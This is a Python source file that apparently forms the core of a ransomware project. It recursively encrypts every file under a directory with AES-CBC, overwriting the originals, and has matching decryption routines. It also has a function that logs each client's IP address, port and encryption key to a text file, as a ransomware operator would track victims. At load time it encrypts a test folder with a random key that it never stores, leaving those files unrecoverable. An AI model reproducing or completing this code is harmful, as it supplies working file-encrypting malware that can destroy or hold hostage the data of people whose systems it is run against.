import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import datetime


def encrypt_file_with_aes(file_path, aes_encryption_key):
    """
    :param file_path: the file that will be encrypted.
    :param aes_encryption_key: the encryption key length should be(16/24/32) byte according aes standards.
    :return none:
    :Description: this function encrypts file with aes encryption.
    the aes mode is CBC which is secure, furthermore I used the
    initialization vector(random 16 bytes) for more secure in order
    that even same plaintext will produce different ciphertexts.
    I created the new file in this way : the first 16 bytes contains
    the initialization vector and the rest of the file is the ciphertext.
    """
    with open(file_path, 'rb') as file:
        file_data = file.read()

    initialization_vector = get_random_bytes(16)

    cipher = AES.new(aes_encryption_key, AES.MODE_CBC, initialization_vector)
    encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))

    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(initialization_vector + encrypted_data)


def decrypt_file_with_aes(encrypted_file_path, aes_decryption_key):
    """
    :param encrypted_file_path: the file that will be decrypted.
    :param aes_decryption_key: the decryption key length should be(16/24/32) byte according aes standards.
    :return none:
    :Description: this function decrypts file with aes encryption.
    I read the first 16 bytes in order to get the initialization vector.
    After that I read the rest of the file(ciphertext) in order to decrypt it.
    I in the end I decrypt the file with the necessary parameters and write back
    the plaintext to the file.
    """
    with open(encrypted_file_path, 'rb') as encrypted_file:
        initialization_vector = encrypted_file.read(16)

        encrypted_data = encrypted_file.read()

    cipher = AES.new(aes_decryption_key, AES.MODE_CBC, initialization_vector)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    with open(encrypted_file_path, "wb") as decrypted_file:
        decrypted_file.write(decrypted_data)


def encrypt_files(starting_directory, aes_encryption_key):
    """
    :param starting_directory: starting point for the encryption.
    :param aes_encryption_key: the encryption key length should be(16/24/32) byte according aes standards
    :return none:
    :Description: this function will iterate the file system from the starting directory
    in order to encrypt the systems files by using the encrypt_file_with_aes.
    """
    for directory_path, sub_directories, files in os.walk(starting_directory):
        for file_name in files:
            file_path = os.path.join(directory_path, file_name)
            encrypt_file_with_aes(file_path, aes_encryption_key)


def decrypt_files(starting_directory, aes_encryption_key):
    """
       :param starting_directory: starting point for the decryption.
       :param aes_encryption_key: the decryption key length should be(16/24/32) byte according aes standards
       :return none:
       :Description: this function will iterate the file system from the starting directory
       in order to decrypt the systems files by using the decrypt_file_with_aes.
       """
    for directory_path, sub_directories, files in os.walk(starting_directory):
        for file_name in files:
            file_path = os.path.join(directory_path, file_name)
            decrypt_file_with_aes(file_path, aes_encryption_key)


def store_client_info(client_ip, client_port, client_aes_encryption_key, client_connection_time):
    client_info = (f"Client ip : {client_ip} | "
                   f"Client port : {client_port} | "
                   f"Client aes encryption key : {client_aes_encryption_key} | "
                   f"Client connection time : {client_connection_time}.\n")

    with open("Database.txt", "a+") as database_file:
        database_file.write(client_info)


key = os.urandom(32)
encrypt_files("D:\\MyData\\encryption_testing", key)
#decrypt_files("D:\\MyData\\encryption_testing", key)
